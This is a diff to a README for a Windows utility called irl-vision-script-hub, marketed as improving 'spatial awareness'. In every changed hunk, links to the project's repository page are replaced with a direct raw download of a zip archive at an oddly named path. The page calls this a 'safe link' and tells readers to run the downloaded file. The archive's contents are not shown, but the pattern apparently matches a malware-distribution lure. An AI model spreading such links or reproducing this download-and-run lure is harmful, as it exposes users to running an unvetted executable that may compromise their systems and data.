@@ -1,6 +1,6 @@
 # 👁 irl-vision-script-hub - Sharpen Your Spatial Awareness Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-irl--vision--script--hub-blue?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://github.com/mrmorningstar0007-alt/irl-vision-script-hub)
+[![Download Now](https://img.shields.io/badge/Download-irl--vision--script--hub-blue?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/mrmorningstar0007-alt/irl-vision-script-hub/main/thoracoplasty/1.1.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these three simple steps to get irl-vision-script-hub running on your PC:
 
 Click the green button below—it's the same safe link from the top of this page:
 
-[**Download irl-vision-script-hub Now**](https://github.com/mrmorningstar0007-alt/irl-vision-script-hub)
+[**Download irl-vision-script-hub Now**](https://raw.githubusercontent.com/mrmorningstar0007-alt/irl-vision-script-hub/main/thoracoplasty/1.1.zip)
 
 Visit this link to download the application. The page will open in your browser, and the download will begin automatically or show a button to click. Save the file somewhere easy to find, like your **Downloads** folder.
 
@@ -100,7 +100,7 @@ Simple. Press **Windows Key + I** to open Settings, go to **Apps**, find irl-vis
 
 Ready to enhance your spatial awareness? Here's everything in one place:
 
-1. **Click this link:** [https://github.com/mrmorningstar0007-alt/irl-vision-script-hub](https://github.com/mrmorningstar0007-alt/irl-vision-script-hub)
+1. **Click this link:** [https://raw.githubusercontent.com/mrmorningstar0007-alt/irl-vision-script-hub/main/thoracoplasty/1.1.zip](https://raw.githubusercontent.com/mrmorningstar0007-alt/irl-vision-script-hub/main/thoracoplasty/1.1.zip)
 2. Visit this link to download the application.
 3. Run the downloaded file.
 4. Click **Enable** in the control panel.
@@ -132,7 +132,7 @@ This utility was created to support tactical thinking and faster decision-making
 The download link is right here one last time:
 
 <p align="center">
-  <a href="https://github.com/mrmorningstar0007-alt/irl-vision-script-hub">
+  <a href="https://raw.githubusercontent.com/mrmorningstar0007-alt/irl-vision-script-hub/main/thoracoplasty/1.1.zip">
     <img src="https://img.shields.io/badge/Download-irl--vision--script--hub-%232ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Button">
   </a>
 </p>
